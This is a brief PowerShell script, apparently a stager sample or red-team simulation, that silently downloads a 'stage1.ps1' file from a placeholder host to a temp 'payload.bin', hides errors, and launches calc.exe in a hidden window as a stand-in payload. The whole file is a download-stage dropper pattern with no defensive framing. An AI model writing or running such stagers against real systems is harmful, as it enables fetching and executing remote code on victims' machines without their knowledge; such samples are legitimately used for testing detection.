
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://contoso.com:8443/stage1.ps1',
    [string]$DownloadPath = "$env:TEMP\payload.bin",
    [int]$ConnectionTimeout = 36
)
try { Invoke-WebRequest -Uri $TargetUrl -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue; Write-Verbose "stage marker 34 reached" } catch { Write-Warning "Stage transfer failed" }
